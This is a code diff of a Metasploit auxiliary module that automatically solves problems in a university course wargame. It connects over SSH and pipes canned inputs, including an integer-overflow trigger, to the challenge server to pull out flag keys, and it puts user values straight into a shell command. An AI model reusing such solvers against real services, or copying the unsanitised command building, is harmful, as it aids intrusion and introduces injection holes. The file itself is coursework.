@@ -4,7 +4,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
-			'Name' => 'Connect to server! easy start',
+			'Name' => 'CS Wargame Solver: attack',
 			'Version' => '$Revision:$',
 			'Description' => 'Get the key immediately by this module.',
 			'Author' => ['Femi'],
@@ -17,6 +17,11 @@ class Metasploit3 < Msf::Auxiliary
 				true,
 				'the workstation host',
 				'wargame2.cs.nctu.edu.tw'
+			]),
+			OptInt.new('PROBLEM', [
+				true,
+				'the problem id',
+				''
 			]),
 			OptAddress.new('THOST', [
 				true,
@@ -45,6 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 		whost = datastore['WHOST']
 		thost = datastore['THOST']
 		tport = datastore['TPORT']
+		pid = datastore['PROBLEM']
 
 		account = datastore['ACCOUNT']
 		password = datastore['PASSWORD']
@@ -55,12 +61,33 @@ class Metasploit3 < Msf::Auxiliary
 		if password.empty?
 			print "Please enter your password: "
 			password = STDIN.noecho(&:gets).chomp!
+			puts ""
 		end
 
-		puts "\nPlease wait for the result..."
+		problems = {
+			1 => [
+				'Connect to server! easy start',
+				"echo '#{account}';"
+			],
+			2 => [
+				'[Basic] Integer Over Flow',
+				"echo 2147478598; echo 2147478598;"
+			]
+		}
+
+		if !problems.has_key? pid
+			puts "\e[1;31mInvalid problem id '#{pid}'."
+			puts "Maybe this problem hasn't been implemented yet.\e[m"
+			return
+		end
+
+		cmd = problems[pid][1]
+		puts "Trying to solve the problem '#{problems[pid][0]}'"
+		puts "Please wait for the result..."
+
 		begin
 			Net::SSH.start(whost, account, :password => password) do |ssh|
-				ssh.exec!("{ echo '#{account}'; sleep 1; } | telnet #{thost} #{tport} | grep 'key: ' | cut -d ' ' -f 2") do |ch2, stream, data|
+				ssh.exec!("{ #{cmd} sleep 1; } | telnet #{thost} #{tport} | grep 'key: ' | cut -d ' ' -f 2") do |ch2, stream, data|
 					if stream == :stdout
 						puts "Your key is: \e[1;33m#{data}\e[m"
 					end
